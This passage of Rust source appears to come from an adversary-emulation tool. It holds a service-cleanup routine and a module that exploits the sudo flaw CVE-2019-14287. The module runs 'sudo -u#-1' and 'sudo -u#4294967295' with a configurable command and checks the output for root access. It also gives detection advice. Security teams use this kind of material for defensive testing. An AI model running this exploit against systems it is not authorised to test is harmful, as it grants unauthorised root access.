                        .args(["stop", service_name])
                        .output()
                        .await;
                        
                    match stop_result {
                        Ok(output) if output.status.success() => {
                            info!("✓ Stopped systemd service: {service_name}");
                        }
                        Ok(_) => {
                            warn!("Failed to stop systemd service: {service_name} (may already be stopped)");
                        }
                        Err(e) => {
                            warn!("Error stopping systemd service: {e}");
                        }
                    }
                }
                else if artifact.starts_with("systemd:") {
                    let service_file = artifact.trim_start_matches("systemd:");
                    info!("Removing systemd service file: {service_file}");
                    
                    if Path::new(service_file).exists() {
                        match fs::remove_file(service_file) {
                            Ok(_) => {
                                info!("✓ Removed systemd service file: {service_file}");
                                
                                // Daemon-reload after removing service file
                                let reload_result = Command::new("systemctl")
                                    .arg("daemon-reload")
                                    .output()
                                    .await;
                                    
                                match reload_result {
                                    Ok(output) if output.status.success() => {
                                        info!("✓ Executed systemctl daemon-reload after service removal");
                                    }
                                    Ok(_) => {
                                        warn!("daemon-reload failed after service removal");
                                    }
                                    Err(e) => {
                                        warn!("Error executing daemon-reload: {e}");
                                    }
                                }
                            }
                            Err(e) => {
                                warn!("Failed to remove systemd service file {service_file}: {e}");
                            }
                        }
                    } else {
                        info!("Systemd service file {service_file} does not exist (already removed)");
                    }
                }
                // Handle log file cleanup
                else if Path::new(artifact).exists() && artifact.ends_with(".log") {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("✓ Removed log file: {artifact}"),
                        Err(e) => warn!("Failed to remove log file {artifact}: {e}"),
                    }
                }
            }
            
            info!("✓ Privilege escalation exploitation cleanup completed");
            info!("Note: Sudo command tests and Docker container runs are one-shot and don't require cleanup");
            Ok(())
        })
    }
}

pub struct SudoUnsignedIntegerEscalation {}

#[async_trait]
impl AttackTechnique for SudoUnsignedIntegerEscalation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.003.001".to_string(),
            name: "Sudo Unsigned Integer Privilege Escalation".to_string(),
            description: "Exploits CVE-2019-14287 sudo vulnerability using negative or large unsigned integer user IDs to bypass restrictions".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "command".to_string(),
                    description: "Command to execute with sudo exploit".to_string(),
                    required: false,
                    default: Some("id".to_string()),
                },
                TechniqueParameter {
                    name: "test_both_variants".to_string(),
                    description: "Test both -u#-1 and -u#4294967295 variants".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_sudo_exploit.log".to_string()),
                },
            ],
            detection: "Monitor for sudo commands with negative user IDs (-u#-1) or large unsigned integers (-u#4294967295)".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let command = config
                .parameters
                .get("command")
                .unwrap_or(&"id".to_string())
                .clone();
                
            let test_both = config
                .parameters
                .get("test_both_variants")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase() == "true";
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_sudo_exploit.log".to_string())
                .clone();

            let artifacts = vec![log_file.clone()];
            
            if dry_run {
                info!("[DRY RUN] Would attempt sudo unsigned integer privilege escalation");
                info!("[DRY RUN] Command: sudo -u#-1 {command}");
                if test_both {
                    info!("[DRY RUN] Command: sudo -u#4294967295 {command}");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would test sudo unsigned integer vulnerability".to_string(),
                    artifacts,
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log_file_handle, "# SignalBench Sudo Unsigned Integer Privilege Escalation Test").unwrap();
            writeln!(log_file_handle, "# CVE-2019-14287 - Sudo vulnerability").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK: T1548.003.001").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# Target Command: {command}").unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();

            // Check if sudo is available
            let sudo_check = Command::new("which")
                .arg("sudo")
                .output()
                .await;
                
            match sudo_check {
                Ok(output) => {
                    if !output.status.success() {
                        writeln!(log_file_handle, "ERROR: sudo command not found on system").unwrap();
                        return Ok(SimulationResult {
                            technique_id: self.info().id,
                            success: false,
                            message: "sudo command not available on system".to_string(),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    writeln!(log_file_handle, "sudo command available at: {}", String::from_utf8_lossy(&output.stdout).trim()).unwrap();
                },
                Err(e) => {
                    writeln!(log_file_handle, "ERROR: Failed to check for sudo: {e}").unwrap();
                    return Err(format!("Failed to check for sudo: {e}"));
                }
            }

            // Check sudo version for vulnerability assessment
            let version_check = Command::new("sudo")
                .args(["--version"])
                .output()
                .await;
                
            match version_check {
                Ok(output) => {
                    let version_output = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Sudo version information:\n{version_output}").unwrap();
                    
                    // Basic version check for CVE-2019-14287 (affects versions before 1.8.28)
                    if version_output.contains("1.8.") {
                        writeln!(log_file_handle, "WARNING: This appears to be sudo 1.8.x which may be vulnerable to CVE-2019-14287").unwrap();
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Could not determine sudo version: {e}").unwrap();
                }
            }

            let mut test_results = Vec::new();
            
            // Test variant 1: -u#-1 (negative user ID)
            writeln!(log_file_handle, "\n## Testing sudo -u#-1 vulnerability").unwrap();
            info!("Testing sudo -u#-1 {command}");
            
            let exploit_cmd_1 = format!("sudo -n -u#-1 {command}");
            let result_1 = Command::new("bash")
                .arg("-c")
                .arg(&exploit_cmd_1)
                .output()
                .await;
                
            match result_1 {
                Ok(output) => {
                    let exit_code = output.status.code().unwrap_or(-1);
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    
                    writeln!(log_file_handle, "Command: {exploit_cmd_1}").unwrap();
                    writeln!(log_file_handle, "Exit code: {exit_code}").unwrap();
                    writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                    writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                    
                    if exit_code == 0 && stdout.contains("uid=0") {
                        writeln!(log_file_handle, "CRITICAL: sudo -u#-1 vulnerability EXPLOITED! Gained root privileges").unwrap();
                        test_results.push("VULNERABLE to -u#-1".to_string());
                    } else if stderr.contains("not allowed") || stderr.contains("permission denied") || stderr.contains("password is required") || stderr.contains("no tty present") {
                        writeln!(log_file_handle, "SECURE: sudo properly blocked -u#-1 attempt").unwrap();
                        test_results.push("PROTECTED against -u#-1".to_string());
                    } else {
                        writeln!(log_file_handle, "UNKNOWN: Unexpected response to -u#-1 attempt").unwrap();
                        test_results.push("UNKNOWN response to -u#-1".to_string());
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "ERROR executing sudo -u#-1: {e}").unwrap();
                    test_results.push("ERROR with -u#-1".to_string());
                }
            }

            // Test variant 2: -u#4294967295 (large unsigned integer)
            if test_both {
                writeln!(log_file_handle, "\n## Testing sudo -u#4294967295 vulnerability").unwrap();
                info!("Testing sudo -u#4294967295 {command}");
                
                let exploit_cmd_2 = format!("sudo -n -u#4294967295 {command}");
                let result_2 = Command::new("bash")
                    .arg("-c")
                    .arg(&exploit_cmd_2)
                    .output()
                    .await;
                    
                match result_2 {
                    Ok(output) => {
                        let exit_code = output.status.code().unwrap_or(-1);
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        
                        writeln!(log_file_handle, "Command: {exploit_cmd_2}").unwrap();
                        writeln!(log_file_handle, "Exit code: {exit_code}").unwrap();
                        writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                        writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                        
                        if exit_code == 0 && stdout.contains("uid=0") {
                            writeln!(log_file_handle, "CRITICAL: sudo -u#4294967295 vulnerability EXPLOITED! Gained root privileges").unwrap();
                            test_results.push("VULNERABLE to -u#4294967295".to_string());
                        } else if stderr.contains("not allowed") || stderr.contains("permission denied") || stderr.contains("password is required") || stderr.contains("no tty present") {
                            writeln!(log_file_handle, "SECURE: sudo properly blocked -u#4294967295 attempt").unwrap();
                            test_results.push("PROTECTED against -u#4294967295".to_string());
                        } else {
                            writeln!(log_file_handle, "UNKNOWN: Unexpected response to -u#4294967295 attempt").unwrap();
                            test_results.push("UNKNOWN response to -u#4294967295".to_string());
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "ERROR executing sudo -u#4294967295: {e}").unwrap();
                        test_results.push("ERROR with -u#4294967295".to_string());
                    }
                }
            }

            writeln!(log_file_handle, "\n## Test Summary").unwrap();
            for result in &test_results {
                writeln!(log_file_handle, "- {result}").unwrap();
            }
            
            let success = !test_results.is_empty();
            let message = if test_results.iter().any(|r| r.contains("VULNERABLE")) {
                "CRITICAL: System vulnerable to sudo unsigned integer privilege escalation (CVE-2019-14287)".to_string()
            } else if test_results.iter().any(|r| r.contains("PROTECTED")) {
                "System appears protected against sudo unsigned integer privilege escalation".to_string()
            } else {
                format!("Completed sudo unsigned integer privilege escalation test - Results: {}", test_results.join(", "))
            };

            info!("Sudo unsigned integer privilege escalation test completed");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success,
                message,
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}
